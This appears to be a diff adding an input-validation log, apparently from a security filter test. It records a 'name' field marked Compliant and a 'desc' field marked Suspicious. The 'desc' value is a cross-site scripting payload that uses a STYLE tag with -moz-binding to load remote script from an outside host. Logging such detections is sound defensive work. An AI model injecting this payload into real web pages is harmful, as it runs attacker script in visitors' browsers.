@@ -1,0 +1,5 @@
+2016-06-24T08:14:58.330-06:00
+name : FP.'O'.
+desc : <STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+The parameter: name :  having value: FP.'O'. is: Compliant
+The parameter: desc :  having value: <STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE> is: Suspicious
